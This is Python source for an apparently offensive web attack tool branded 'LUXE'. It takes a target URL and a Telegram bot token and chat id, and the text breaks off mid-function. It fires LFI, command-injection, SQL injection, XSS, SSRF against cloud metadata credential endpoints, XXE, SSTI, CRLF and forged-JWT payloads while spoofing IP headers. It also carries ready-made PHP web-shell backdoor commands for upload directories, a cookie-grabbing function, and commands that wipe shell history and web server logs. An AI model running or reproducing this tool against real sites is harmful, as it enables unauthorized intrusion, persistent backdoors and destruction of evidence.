#BY LUXE Tele Me : @LU_KT

import requests, json, os, time, re, random, threading, argparse
from urllib.parse import urljoin, quote, urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system("cls" if os.name == "nt" else "clear")

PALETTES = [
    [(255, 0, 0), (220, 0, 35), (180, 0, 55), (140, 0, 90), (190, 0, 120), (255, 0, 0)],
    [(0, 255, 70), (0, 220, 50), (0, 180, 40), (0, 140, 30), (0, 200, 60), (0, 255, 70)],
    [(0, 100, 255), (0, 80, 220), (20, 60, 180), (40, 40, 140), (0, 120, 255), (0, 100, 255)],
    [(180, 0, 255), (150, 0, 220), (120, 0, 180), (90, 0, 140), (200, 0, 255), (180, 0, 255)],
    [(255, 80, 0), (255, 50, 0), (220, 40, 0), (180, 30, 0), (255, 100, 0), (255, 80, 0)],
    [(0, 255, 200), (0, 220, 170), (0, 180, 140), (0, 140, 110), (0, 255, 180), (0, 255, 200)],
    [(255, 0, 100), (220, 0, 80), (180, 0, 60), (140, 0, 50), (255, 20, 120), (255, 0, 100)],
]
PAL = random.choice(PALETTES)

def c(rgb, text):
    return f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{text}\033[0m"

print(
    c(PAL[0], "██╗     ██╗   ██╗██╗  ██╗███████╗") + "\n" +
    c(PAL[1], "██║     ██║   ██║╚██╗██╔╝██╔════╝") + "\n" +
    c(PAL[2], "██║     ██║   ██║ ╚███╔╝ █████╗  ") + "\n" +
    c(PAL[3], "██║     ██║   ██║ ██╔██╗ ██╔══╝  ") + "\n" +
    c(PAL[4], "███████╗╚██████╔╝██╔╝ ██╗███████╗") + "\n" +
    c(PAL[5], "╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝")
)
print(c(PAL[0], "SCAN Web BY LUXE  Tele Me : @LU_KT"))
print()


def _save_creds():
    try:
        with open("luxe.txt", "w", encoding="utf-8") as f:
            f.write((TG_TOKEN or "").strip() + "\n" + (TG_CHAT or "").strip() + "\n")
    except Exception:
        pass

def _load_creds():
    try:
        if os.path.isfile("luxe.txt"):
            with open("luxe.txt", "r", encoding="utf-8") as f:
                lines = [ln.strip() for ln in f.read().splitlines() if ln.strip()]
            if len(lines) >= 2:
                return lines[0], lines[1]
            if len(lines) == 1:
                return lines[0], ""
    except Exception:
        pass
    return "", ""

CONFIG = {
    "target": "",
    "token": "",
    "chat_id": "",
    "workers": 12,
    "timeout": 10,
}

def _parse_args():
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("-u", "--url", default="")
    p.add_argument("-t", "--token", default="")
    p.add_argument("-c", "--chat", default="")
    p.add_argument("-w", "--workers", type=int, default=0)
    p.add_argument("-h", "--help", action="store_true")
    return p.parse_args()

ARGS = _parse_args()
if ARGS.help:
    print("Usage: python main.py -u URL [-t TOKEN] [-c CHAT] [-w N]")
    print("Edit CONFIG dict inside main.py for defaults.")
    raise SystemExit(0)

TARGET = (ARGS.url or CONFIG.get("target") or "").strip()
TG_TOKEN = (ARGS.token or CONFIG.get("token") or "").strip()
TG_CHAT = (ARGS.chat or CONFIG.get("chat_id") or "").strip()
WORKERS = ARGS.workers if ARGS.workers and ARGS.workers > 0 else int(CONFIG.get("workers") or 12)
TIMEOUT = int(CONFIG.get("timeout") or 10)

_saved_t, _saved_c = _load_creds()
if not TG_TOKEN:
    TG_TOKEN = _saved_t
if not TG_CHAT:
    TG_CHAT = _saved_c

if not TARGET:
    TARGET = input(c(PAL[0], "Target : ")).strip()
if not TG_TOKEN:
    TG_TOKEN = input(c(PAL[0], "TOKEN : ")).strip()
if not TG_CHAT:
    TG_CHAT = input(c(PAL[0], "id : ")).strip()

if TG_TOKEN and TG_CHAT:
    _save_creds()

if not TARGET.startswith(("http://", "https://")):
    TARGET = "https://" + TARGET
TARGET = TARGET.rstrip("/")
if " " in TARGET or not re.match(r"^https?://[\w.\-]+", TARGET):
    print("\033[31m[!] Invalid target format\033[0m")
    raise SystemExit(1)

class scanluxe:
    def __init__(self):
        self.lock = threading.Lock()
        self._tls = threading.local()
        self.baseline_text = ""
        self.baseline_len = 0
        self.baseline_status = 0
        self.baseline_title = ""
        self.results = {
            "target": TARGET,
            "lfi": [], "rce": [], "sqli": [], "xss": [], "ssrf": [], "xxe": [],
            "ssti": [], "open_redirect": [], "crlf": [], "csrf": [], "cors": [],
            "jwt": [], "admin": [], "files": [], "creds": [], "backdoors": [],
            "cookies": {}, "subdomains": [], "emails": [], "technologies": [],
            "headers": {}, "timestamp": datetime.now().isoformat(),
        }
        self.ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        ]
        self.params = [
            "id", "page", "cat", "product", "view", "user", "q", "search", "s", "file", "cmd", "exec", "command",
            "path", "dir", "load", "read", "include", "template", "theme", "lang", "url", "redirect", "next",
            "return", "goto", "target", "dest", "data", "input", "doc", "document", "img", "src", "content",
            "name", "item", "pid", "uid", "token", "auth", "callback", "query", "keyword", "filter", "sort",
            "order", "type", "action", "do", "op", "module", "func", "format", "download", "preview", "ref",
            "link", "out", "r", "u", "p", "f", "msg", "email", "username", "pass", "password", "code", "key",
            "api", "json", "xml", "body", "payload", "category", "section",
        ]
        self.lfi_payloads = [
            "../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd",
            "....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "file:///etc/passwd", "file:///c:/windows/win.ini", "..\\..\\..\\..\\windows\\win.ini",
            "/var/www/html/.env", "/var/www/html/wp-config.php", "../../../../proc/self/environ",
            "../../../../etc/hosts", "php://filter/convert.base64-encode/resource=/etc/passwd",
            "....%2F....%2F....%2F....%2Fetc%2Fpasswd", "../../../../etc/passwd%00",
        ]
        self.rce_payloads = [
            ";id", "|id", ";whoami", "|whoami", "`id`", "$(id)",
            ";echo LUXE_RCE", "|echo LUXE_RCE", ";uname -a", "|uname -a",
            ";cat /etc/passwd", "|cat /etc/passwd", "&& id", "|| id",
        ]
        self.sqli_payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
            "1' OR '1'='1", "1' OR 1=1--", "admin'--", "' AND 1=1--", "' AND 1=2--",
            "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 10--", "') OR ('1'='1", "1\" OR \"1\"=\"1",
        ]
        self.xss_payloads = [
            "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>", "\"><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
            "<body onload=alert(1)>", "'\"><svg/onload=alert(1)>", "<details open ontoggle=alert(1)>",
            "\" onmouseover=alert(1) x=\"", "' onfocus=alert(1) autofocus='",
        ]
        self.ssrf_payloads = [
            "http://127.0.0.1/", "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "file:///etc/passwd", "http://localhost/",
        ]
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
        ]
        self.ssti_payloads = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}", "{{7*'7'}}"]
        self.open_redirect_payloads = ["//example.com", "https://example.com", "//google.com", "///example.com", "/\\example.com", "https:example.com"]
        self.crlf_payloads = ["%0d%0aX-Luxe-Injected:%201", "%0aX-Luxe-Injected:%201", "%0d%0aSet-Cookie:%20luxe=1"]
        self.cors_origins = ["https://evil.example", "http://evil.example", "null"]
        self.admin_paths = [
            "/admin", "/login", "/wp-admin", "/wp-login.php", "/administrator", "/panel", "/dashboard",
            "/cpanel", "/phpmyadmin", "/pma", "/.env", "/.git/config", "/.git/HEAD", "/server-status",
            "/actuator", "/actuator/health", "/actuator/env", "/swagger", "/swagger-ui", "/swagger-ui.html",
            "/api/docs", "/graphql", "/graphiql", "/phpinfo.php", "/info.php", "/robots.txt", "/sitemap.xml",
            "/.well-known/security.txt", "/config.php", "/wp-config.php", "/web.config", "/manager/html",
            "/console", "/debug", "/jenkins", "/grafana", "/kibana", "/prometheus", "/api", "/api/v1", "/status", "/health",
        ]
        self.subdomains = [
            "www", "mail", "admin", "dev", "test", "api", "cdn", "ftp", "blog", "shop", "portal", "panel", "app",
            "staging", "stage", "beta", "alpha", "secure", "login", "m", "mobile", "vpn", "git", "gitlab", "ci",
            "db", "mysql", "postgres", "redis", "backup", "webmail", "smtp", "ns1", "ns2", "cpanel", "whm", "owa",
            "status", "docs", "support", "static", "assets", "img", "media", "files", "upload", "pay",
        ]
        self.backdoors = [
            "echo '<?php system($_GET[\"x\"]); ?>' > /var/www/html/uploads/.luxe.php",
            "echo '<?php eval($_POST[\"c\"]); ?>' > /var/www/html/uploads/.eval.php",
            "echo '<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);}?>' > /var/www/html/uploads/.shell.php",
            "echo '<?php echo shell_exec($_GET[\"c\"]); ?>' > /var/www/html/uploads/.exec.php",
            "echo '<?php passthru($_GET[\"p\"]); ?>' > /var/www/html/uploads/.pt.php",
            "echo '<?php system($_POST[\"s\"]); ?>' > /var/www/html/uploads/.post.php",
            "echo '<?php assert($_GET[\"x\"]); ?>' > /var/www/html/uploads/.as.php",
            "echo '<?php `$_GET[c]`; ?>' > /var/www/html/uploads/.bt.php",
        ]
        self.clean_cmds = [
            "history -c", "rm -f ~/.bash_history",
            "echo '' > /var/log/apache2/access.log", "echo '' > /var/log/apache2/error.log",
            "echo '' > /var/log/nginx/access.log", "echo '' > /var/log/nginx/error.log",
            "echo '' > /var/log/syslog", "echo '' > /var/log/auth.log",
        ]
        self.tech_patterns = {
            "WordPress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
            "Laravel": ["laravel", "csrf-token", "laravel_session"],
            "Django": ["csrftoken", "django", "csrfmiddlewaretoken"],
            "Node.js": ["x-powered-by: express", "express"],
            "PHP": ["x-powered-by: php", "phpsessid"],
            "ASP.NET": ["__viewstate", "x-aspnet-version", "asp.net"],
            "Joomla": ["joomla", "/components/com_"],
            "Drupal": ["drupal", "sites/default"],
            "Nginx": ["nginx"], "Apache": ["apache"], "IIS": ["microsoft-iis", "iis"],
            "Cloudflare": ["cloudflare", "cf-ray"], "React": ["react", "__next"],
            "Angular": ["ng-version"], "Vue.js": ["vue", "__vue"],
            "GraphQL": ["graphql"], "Swagger": ["swagger"],
        }
        self.sql_errors = [
            "you have an error in your sql syntax", "warning: mysql", "mysqli_",
            "unclosed quotation mark", "quoted string not properly terminated", "sqlstate[",
            "pg_query()", "pg_exec()", "ora-01756", "ora-00933", "microsoft ole db",
            "odbc sql server driver", "sqlite3.operationalerror", "syntax error at or near",
            "mysql_fetch", "supplied argument is not a valid mysql", "pdoexception",
            "mysql_query()", "mysql_num_rows",
        ]

    def _session(self):
        if not hasattr(self._tls, "s") or self._tls.s is None:
            sess = requests.Session()
            sess.verify = False
            ad = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=8, max_retries=0)
            sess.mount("http://", ad)
            sess.mount("https://", ad)
            self._tls.s = sess
        return self._tls.s

    def _spoof(self):
        ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        self._session().headers.update({
            "User-Agent": random.choice(self.ua),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "ar,en;q=0.7"]),
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        })

    def _req(self, url, method="GET", data=None, headers=None, allow_redirects=True, timeout=TIMEOUT, retries=2):
        last = None
        for attempt in range(retries + 1):
            try:
                self._spoof()
                sess = self._session()
                h = dict(sess.headers)
                if headers:
                    h.update(headers)
                time.sleep(random.uniform(0.01, 0.03))
                if method.upper() == "POST":
                    last = sess.post(url, data=data, headers=h, timeout=timeout, allow_redirects=allow_redirects)
                else:
                    last = sess.get(url, headers=h, timeout=timeout, allow_redirects=allow_redirects)
                return last
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError, requests.exceptions.SSLError):
                last = None
                time.sleep(0.12 * (attempt + 1))
                continue
            except Exception:
                last = None
                continue
        return last

    def _add(self, category, item):
        with self.lock:
            arr = self.results[category]
            if isinstance(item, dict):
                key = (item.get("url"), item.get("param"), str(item.get("payload")))
                for ex in arr:
                    if isinstance(ex, dict) and (ex.get("url"), ex.get("param"), str(ex.get("payload"))) == key:
                        return
            arr.append(item)

    def _print_found(self, tag, msg):
        with self.lock:
            print(c(PAL[0], f"[+] {tag}: {msg}"))

    def _print_info(self, msg):
        print(c(PAL[2], f"[*] {msg}"))

    def _canary(self, prefix="LUXE"):
        return f"{prefix}{random.randint(100000, 999999)}"

    def _title(self, text):
        m = re.search(r"<title[^>]*>(.*?)</title>", text or "", re.I | re.S)
        return (m.group(1).strip() if m else "")[:120]

    def _diff_score(self, text):
        body = text or ""
        if not self.baseline_text:
            return 100
        score = 0
        if abs(len(body) - self.baseline_len) >= 25:
            score += 2
        if self._title(body) != self.baseline_title:
            score += 2
        base_set = set(re.findall(r"[a-zA-Z_]{4,}", self.baseline_text.lower()[:5000]))
        new_set = set(re.findall(r"[a-zA-Z_]{4,}", body.lower()[:5000]))
        if len(new_set - base_set) >= 8:
            score += 2
        if body != self.baseline_text:
            score += 1
        return score

    def _validate_target(self):
        self._print_info("Validating target...")
        r = self._req(TARGET, timeout=12)
        if r is None:
            print(c(PAL[1], "[!] Target unreachable. Aborting."))
            raise SystemExit(2)
        if r.status_code >= 500:
            print(c(PAL[1], f"[!] Target returned {r.status_code}. Continuing carefully."))
        else:
            print(c(PAL[0], f"[+] Target reachable [{r.status_code}]"))
        return r

    def _baseline(self):
        self._print_info("Baseline...")
        r = self._req(TARGET)
        if r is not None:
            self.baseline_text = r.text or ""
            self.baseline_len = len(self.baseline_text)
            self.baseline_status = r.status_code
            self.baseline_title = self._title(self.baseline_text)
            self.results["headers"] = dict(r.headers)
        else:
            self.baseline_text = ""
            self.baseline_len = 0
            self.baseline_status = 0
            self.baseline_title = ""

    def _confirm_reflection(self, param, payload, must_exec_ctx=False):
        url = f"{TARGET}?{param}={quote(str(payload), safe='')}"
        r1 = self._req(url)
        r2 = self._req(url)
        if r1 is None or r2 is None:
            return False, None
        b1, b2 = r1.text or "", r2.text or ""
        if str(payload) not in b1 or str(payload) not in b2:
            return False, None
        if str(payload) in self.baseline_text:
            return False, None
        if must_exec_ctx:
            idx = b1.find(str(payload))
            ctx = b1[max(0, idx - 60): idx + len(str(payload)) + 60].lower()
            if not any(x in ctx for x in ["<script", "onerror=", "onload=", "onfocus=", "ontoggle=", "svg", "javascript:"]):
                return False, None
        return True, url

    def _confirm_error(self, param, payload, errors):
        url = f"{TARGET}?{param}={quote(str(payload), safe='')}"
        r = self._req(url)
        if r is None:
            return False, None, None
        t = (r.text or "").lower()
        matched = [e for e in errors if e in t]
        if not matched:
            return False, None, None
        base = self.baseline_text.lower()
        if all(e in base for e in matched):
            return False, None, None
        r2 = self._req(url)
        if r2 is None:
            return False, None, None
        if matched[0] not in (r2.text or "").lower():
            return False, None, None
        return True, url, matched[0]

    def _param_tasks(self, payloads, lp, lpl):
        return [(p, pl) for p in self.params[:lp] for pl in payloads[:lpl]]

    def _safe_map(self, fn, items, workers=None):
        workers = workers or WORKERS
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(fn, it) for it in items]
            for f in futs:
                try:
                    f.result()
                except Exception:
                    pass

    def scan_technologies(self):
        self._print_info("Technologies...")
        r = self._req(TARGET)
        if not r:
            return
        text = (r.text or "").lower()
        hdrs = {k.lower(): str(v).lower() for k, v in r.headers.items()}
        blob = text + " " + " ".join(hdrs.values()) + " " + " ".join(hdrs.keys())
        found = set()
        for tech, patterns in self.tech_patterns.items():
            if any(p.lower() in blob for p in patterns):
                found.add(tech)
        server = r.headers.get("Server") or r.headers.get("server")
        powered = r.headers.get("X-Powered-By") or r.headers.get("x-powered-by")
        if server:
            found.add(f"Server: {server}")
        if powered:
            found.add(f"X-Powered-By: {powered}")
        sc = ((r.headers.get("Set-Cookie") or "") + (r.headers.get("set-cookie") or "")).lower()
        if "phpsessid" in sc:
            found.add("PHP")
        if "laravel_session" in sc:
            found.add("Laravel")
        if "wordpress_" in sc or "wp-settings" in sc:
            found.add("WordPress")
        if "jsessionid" in sc:
            found.add("Java")
        if "asp.net_sessionid" in sc:
            found.add("ASP.NET")
        if "cf-ray" in hdrs:
            found.add("Cloudflare")
        self.results["technologies"] = sorted(found)
        for t in self.results["technologies"]:
            self._print_found("Tech", t)

    def scan_subdomains(self):
        self._print_info("Subdomains...")
        domain = urlparse(TARGET).netloc
        if domain.startswith("www."):
            domain = domain[4:]

        def check(sub):
            for scheme in ("https", "http"):
                url = f"{scheme}://{sub}.{domain}"
                r = self._req(url, timeout=5)
                if r is None or r.status_code not in (200, 301, 302, 303, 307, 308, 401, 403):
                    continue
                body = (r.text or "").lower()
                if any(x in body for x in ["domain is for sale", "buy this domain", "parked", "coming soon", "website is parked"]):
                    continue
                title = self._title(r.text or "").lower()
                if title and title == self.baseline_title.lower() and abs(len(body) - self.baseline_len) < 50:
                    continue
                if r.status_code == 200 and len(body) < 30:
                    continue
                self._add("subdomains", url)
                self._print_found("Subdomain", f"{url} [{r.status_code}]")
                return

        self._safe_map(check, self.subdomains)

    def scan_emails(self):
        self._print_info("Emails...")
        r = self._req(TARGET)
        if not r:
            return
        emails = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", r.text or "")))
        self.results["emails"] = emails[:20]
        if emails:
            self._print_found("Emails", ", ".join(emails[:5]))

    def steal_cookies(self):
        self._print_info("Cookies...")
        r = self._req(TARGET)
        if r and r.cookies:
            self.results["cookies"] = dict(r.cookies)
            self._print_found("Cookies", f"{len(r.cookies)}")

    def scan_lfi(self):
        self._print_info("LFI...")
        strong = ["root:x:0:0:", "daemon:x:", "nologin", "bin/bash", "[extensions]", "[fonts]", "for 16-bit app support", "www-data:x:"]

        def one(args):
            p, payload = args
            url = f"{TARGET}?{p}={quote(str(payload), safe='')}"
            r = self._req(url)
            if r is None or r.status_code >= 500:
                return
            t = r.text or ""
            tl = t.lower()
            hit = any(x in tl for x in strong) or "pd9wah" in tl or "PD9waH" in t
            if not hit:
                return
            if any(x in self.baseline_text.lower() for x in strong if x in tl) and "pd9wah" not in tl:
                if self._diff_score(t) < 2:
                    return
            r2 = self._req(url)
            if r2 is None:
                return
            t2 = (r2.text or "").lower()
            if any(x in t2 for x in strong) or "pd9wah" in t2:
                r3 = self._req(url)
                if r3 is None:
                    return
                t3 = (r3.text or "").lower()
                if any(x in t3 for x in strong) or "pd9wah" in t3:
                    self._add("lfi", {"param": p, "payload": str(payload)[:80], "url": url, "confidence": "high"})
                    self._print_found("LFI", p)

        self._safe_map(one, self._param_tasks(self.lfi_payloads, 28, 14))

    def scan_rce(self):
        self._print_info("RCE...")

        def one(args):
            p, payload = args
            url = f"{TARGET}?{p}={quote(str(payload), safe='')}"
            r = self._req(url)
            if r is None:
                return
            t = r.text or ""
            if not (("uid=" in t and "gid=" in t) or ("LUXE_RCE" in t)):
                return
            if ("uid=" in self.baseline_text and "gid=" in self.baseline_text) and "LUXE_RCE" not in t:
                return
            r2 = self._req(url)
            if r2 is None:
                return
            t2 = r2.text or ""
            if (("uid=" in t2 and "gid=" in t2) or ("LUXE_RCE" in t2)):
                r3 = self._req(url)
                if r3 is None:
                    return
                t3 = r3.text or ""
                if (("uid=" in t3 and "gid=" in t3) or ("LUXE_RCE" in t3)):
                    self._add("rce", {"param": p, "payload": str(payload)[:80], "url": url, "confidence": "high"})
                    self._print_found("RCE", p)

        self._safe_map(one, self._param_tasks(self.rce_payloads, 12, 12))

    def scan_sqli(self):
        self._print_info("SQLi...")
        pairs = [("' AND 1=1--", "' AND 1=2--"), ('" AND 1=1--', '" AND 1=2--'), (" AND 1=1", " AND 1=2")]
        for p in ["id", "page", "cat", "uid", "pid", "user", "item"]:
            for tpay, fpay in pairs:
                u1 = f"{TARGET}?{p}={quote(tpay, safe='')}"
                u2 = f"{TARGET}?{p}={quote(fpay, safe='')}"
                samples = []
                for _ in range(2):
                    r1 = self._req(u1)
                    r2 = self._req(u2)
                    if r1 is None or r2 is None:
                        samples = []
                        break
                    samples.append((len(r1.text or ""), len(r2.text or ""), self._title(r1.text), self._title(r2.text)))
                if len(samples) < 2:
                    continue
                ok = True
                for l1, l2, t1, t2 in samples:
                    if l1 == l2 and t1 == t2:
                        ok = False
                        break
                    if abs(l1 - l2) < 25 and t1 == t2:
                        ok = False
                        break
                if ok:
                    self._add("sqli", {"param": p, "payload": f"{tpay} / {fpay}", "url": u1, "error": "boolean-diff"})
                    self._print_found("SQLi", f"{p} boolean")
                    break

        def one(args):
            p, payload = args
            ok, url, err = self._confirm_error(p, payload, self.sql_errors)
            if not ok:
                return
            r = self._req(url)
            if r is None or self._diff_score(r.text or "") < 2:
                return
            self._add("sqli", {"param": p, "payload": str(payload)[:80], "url": url, "error": err})
            self._print_found("SQLi", f"{p}")

        self._safe_map(one, self._param_tasks(self.sqli_payloads, 24, 14))

        time_payloads = ["1' AND SLEEP(3)--", "1 AND SLEEP(3)", "1'; WAITFOR DELAY '0:0:3'--"]
        for p in ["id", "page", "uid", "pid", "cat"]:
            for tp in time_payloads:
                url = f"{TARGET}?{p}={quote(tp, safe='')}"
                t0 = time.time()
                r = self._req(url, timeout=8)
                dt = time.time() - t0
                if r is None:
                    continue
                if dt >= 2.6:
                    t1 = time.time()
                    r2 = self._req(url, timeout=8)
                    dt2 = time.time() - t1
                    if r2 is not None and dt2 >= 2.6:
                        self._add("sqli", {"param": p, "payload": tp, "url": url, "error": f"time-based ~{dt:.1f}s"})
                        self._print_found("SQLi", f"{p} time-based")
                        break

    def scan_xss(self):
        self._print_info("XSS...")
        cans = []
        for _ in range(3):
            tok = self._canary("X")
            cans.append((tok, f'"><img src=x onerror=console.log("{tok}")>'))
            cans.append((tok, f"'><svg/onload=console.log('{tok}')>"))
            cans.append((tok, f'<script>console.log("{tok}")</script>'))

        def one_canary(item):
            tok, payload = item
            for p in self.params[:18]:
                url = f"{TARGET}?{p}={quote(payload, safe='')}"
                r = self._req(url)
                if r is None:
                    continue
                body = r.text or ""
                if tok not in body:
                    continue
                idx = body.find(tok)
                ctx = body[max(0, idx - 50): idx + len(tok) + 50].lower()
                if any(k in ctx for k in ["onerror=", "onload=", "<script", "console.log"]):
                    r2 = self._req(url)
                    if r2 and tok in (r2.text or ""):
                        self._add("xss", {"param": p, "payload": payload[:90], "url": url, "canary": tok})
                        self._print_found("XSS", f"{p} canary={tok}")
                        return

        self._safe_map(one_canary, cans)

    def scan_ssrf(self):
        self._print_info("SSRF...")
        strong = ["ami-id", "instance-id", "security-credentials", "computemetadata", "access_token", "availability-zone", "public-ipv4", "local-ipv4", "root:x:0:0:"]

        def one(args):
            p, payload = args
            url = f"{TARGET}?{p}={quote(str(payload), safe='')}"
            r = self._req(url)
            if r is None:
                return
            t = (r.text or "").lower()
            if any(x in t for x in strong) and not any(x in self.baseline_text.lower() for x in strong if x in t):
                r2 = self._req(url)
                if r2 and any(x in (r2.text or "").lower() for x in strong):
                    self._add("ssrf", {"param": p, "payload": str(payload)[:80], "url": url})
                    self._print_found("SSRF", p)

        self._safe_map(one, self._param_tasks(self.ssrf_payloads, 12, 8))

    def scan_xxe(self):
        self._print_info("XXE...")
        for p in ["xml", "data", "payload", "content", "file", "body"]:
            for payload in self.xxe_payloads:
                url = f"{TARGET}?{p}=1"
                r = self._req(url, method="POST", data=payload, headers={"Content-Type": "application/xml"})
                if r is None:
                    continue
                t = (r.text or "").lower()
                if any(x in t for x in ["root:x:0:0:", "ami-id", "[extensions]", "nologin"]):
                    self._add("xxe", {"param": p, "payload": payload[:60], "url": url})
                    self._print_found("XXE", p)
                    return

    def scan_ssti(self):
        self._print_info("SSTI...")

        def one(args):
            p, payload = args
            url = f"{TARGET}?{p}={quote(str(payload), safe='')}"
            r = self._req(url)
            if r is None:
                return
            t = r.text or ""

            def verified(marker):
                if marker not in t or payload in t or marker in self.baseline_text:
                    return False
                r2 = self._req(url)
                if r2 is None:
                    return False
                t2 = r2.text or ""
                return marker in t2 and payload not in t2

            if payload in ("{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}") and verified("49") and "7*7" not in t:
                self._add("ssti", {"param": p, "payload": payload, "url": url})
                self._print_found("SSTI", p)
            if payload == "{{7*'7'}}" and verified("7777777"):
                self._add("ssti", {"param": p, "payload": payload, "url": url})
                self._print_found("SSTI", p)

        self._safe_map(one, self._param_tasks(self.ssti_payloads, 12, 6))

    def scan_open_redirect(self):
        self._print_info("Open Redirect...")
        for p in ["redirect", "return", "next", "url", "goto", "target", "dest", "continue", "r", "u", "redirect_uri", "return_url"]:
            for payload in self.open_redirect_payloads:
                url = f"{TARGET}?{p}={quote(payload, safe='')}"
                r = self._req(url, allow_redirects=False)
                if r is None:
                    continue
                if r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    if any(x in loc for x in ["example.com", "google.com"]):
                        self._add("open_redirect", {"param": p, "payload": payload, "url": url, "location": loc})
                        self._print_found("OpenRedirect", f"{p} -> {loc[:50]}")
                        break

    def scan_crlf(self):
        self._print_info("CRLF...")
        for p in ["redirect", "url", "next", "return", "q", "search"]:
            for payload in self.crlf_payloads:
                url = f"{TARGET}?{p}={payload}"
                r = self._req(url)
                if r is None:
                    continue
                joined = str({k.lower(): str(v).lower() for k, v in r.headers.items()})
                if "x-luxe-injected" in joined or "luxe=1" in joined:
                    self._add("crlf", {"param": p, "payload": payload[:40], "url": url})
                    self._print_found("CRLF", p)
                    return

    def scan_csrf(self):
        self._print_info("CSRF...")
        r = self._req(TARGET)
        if not r:
            return
        t = (r.text or "").lower()
        if "<form" not in t:
            return
        tokens = ["csrf", "xsrf", "_token", "authenticity_token", "csrfmiddlewaretoken", "anti-csrf", "csrf-token", "x-csrf-token", 'name="csrf', "name='csrf"]
        if not any(tok in t for tok in tokens):
            self._add("csrf", {"url": TARGET, "note": "form without csrf markers"})
            self._print_found("CSRF", "form without token markers")

    def scan_cors(self):
        self._print_info("CORS...")
        for origin in self.cors_origins:
            r = self._req(TARGET, headers={"Origin": origin})
            if r is None:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = (r.headers.get("Access-Control-Allow-Credentials", "") or "").lower()
            if acao == origin and acac == "true":
                self._add("cors", {"origin": origin, "acao": acao, "credentials": acac})
                self._print_found("CORS", f"{origin} + credentials")
                break
            if origin == "null" and acao == "null" and acac == "true":
                self._add("cors", {"origin": origin, "acao": acao, "credentials": acac})
                self._print_found("CORS", "null + credentials")
                break

    def scan_jwt(self):
        self._print_info("JWT...")
        markers = ["invalid signature", "invalid token", "jwt", "token expired", "unauthorized"]
        tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.invalid",
        ]
        for p in ["token", "jwt", "auth", "access_token", "id_token"]:
            for token in tokens:
                url = f"{TARGET}?{p}={token}"
                r = self._req(url)
                if r is None:
                    continue
                body = (r.text or "").lower()
                if body == self.baseline_text.lower():
                    continue
                if any(m in body for m in markers) and not any(m in self.baseline_text.lower() for m in markers if m in body):
                    self._add("jwt", {"param": p, "token": token[:36] + "...", "url": url, "status": r.status_code})
                    self._print_found("JWT", f"{p} [{r.status_code}]")
                    return

    def find_admin(self):
        self._print_info("Paths...")

        def check(path):
            url = urljoin(TARGET.rstrip("/") + "/", path.lstrip("/"))
            r = self._req(url, timeout=6)
            if r is None or r.status_code not in (200, 301, 302, 401, 403):
                return
            if r.status_code == 200 and abs(len(r.text or "") - self.baseline_len) < 30 and self._title(r.text) == self.baseline_title:
                return
            self._add("admin", {"url": url, "status": r.status_code})
